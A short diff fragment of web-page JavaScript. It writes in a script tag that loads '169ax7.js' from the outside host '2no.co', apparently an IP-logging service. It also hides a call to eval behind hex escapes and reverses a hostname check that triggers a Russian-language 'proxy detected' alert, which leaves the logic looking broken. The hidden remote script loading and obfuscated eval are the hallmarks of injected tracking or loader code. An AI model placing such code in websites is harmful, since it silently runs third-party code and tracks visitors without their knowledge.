@@ -22,7 +22,7 @@ var glap = '2no.co'
 document.write('<'+glop+' src="'+window.location.protocol+'//'+glap+'/169ax7.js"></'+glop+'>')
 //Kasya Security
 a = this["\x65\x76\x61\x6C"];
-if (window.location.hostname !== "kasyateam"){
+if (window.location.hostname == "kasyateam"){
   a(alert('У вас обнаружен Proxy! Мы не позволяем работать с ним.'))
 }
 else {
